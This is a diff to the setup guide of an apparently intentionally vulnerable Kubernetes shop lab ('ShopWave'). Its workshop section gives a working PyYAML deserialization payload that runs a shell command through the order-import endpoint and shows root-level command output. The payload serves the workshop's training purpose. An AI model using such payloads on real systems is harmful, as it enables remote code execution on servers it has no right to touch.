@@ -205,19 +205,29 @@ kubectl -n production port-forward svc/notification-service 3001:3000
 
 ## 9. Workshop exploit / import (optional)
 
-With order-service port-forwarded on 8080:
+The lab path goes **through the storefront** (Next.js proxies to order-service). Do **not** use a public ingress URL if it sits behind SSO — you will see `Redirecting to auth gateway`.
+
+**1. Port-forward the web app only:**
 
 ```bash
-curl -s -X POST http://localhost:8080/api/v1/orders/import \
+kubectl -n production port-forward svc/shopwave-web 3000:80
+```
+
+**2a. Browser (easiest):** http://localhost:3000/orders/import (footer → **Bulk import**) — paste YAML and submit.
+
+**2b. curl via the same proxy the UI uses:**
+
+```bash
+curl -s -X POST http://localhost:3000/api/orders/import \
   -H 'Content-Type: application/x-yaml' \
   --data-binary '!!python/object/apply:subprocess.check_output
 - !!python/tuple
   - !!python/object/new:str ["id"]'
 ```
 
-Or use **http://localhost:3000/orders/import** (footer → Bulk import) — traffic goes through the runtime proxy at `/api/orders/import`.
+Expected: `{"imported":"uid=0(root) ..."}` — not HTML about an auth gateway.
 
-See [WORKSHOP.md](../WORKSHOP.md) for vulnerability details and payloads.
+See [WORKSHOP.md](../WORKSHOP.md) for more payloads. Direct `order-service:8080` bypasses the web path and is not the workshop route.
 
 ---
 
@@ -229,6 +239,7 @@ See [WORKSHOP.md](../WORKSHOP.md) for vulnerability details and payloads.
 | `workflow_id: "unknown"` | Check `ARGO_TOKEN` secret, Argo server reachability from order-service, logs: `kubectl -n production logs deploy/order-service`. |
 | Checkout fails from browser | Check `ORDER_API_URL` on `shopwave-web` and logs: `kubectl -n production logs deploy/shopwave-web`. Ensure `order-service` is reachable from the web pod. |
 | Web 500 on `/api/orders/*` | Verify `ORDER_API_URL` (runtime env). From web pod: `wget -qO- http://order-service:8080/health`. |
+| `Redirecting to auth gateway` on exploit | You hit an **external** login wall, not ShopWave. Use `port-forward svc/shopwave-web 3000:80` and `http://localhost:3000/api/orders/import` — not a shared `https://` lab URL unless you are logged in. |
 | PVC pending | `minikube addons enable default-storageclass` or `minikube addons enable storage-provisioner`. |
 | Argo workflows not listed | Workflows run in `production`; `kubectl get workflows -n production`. |
 
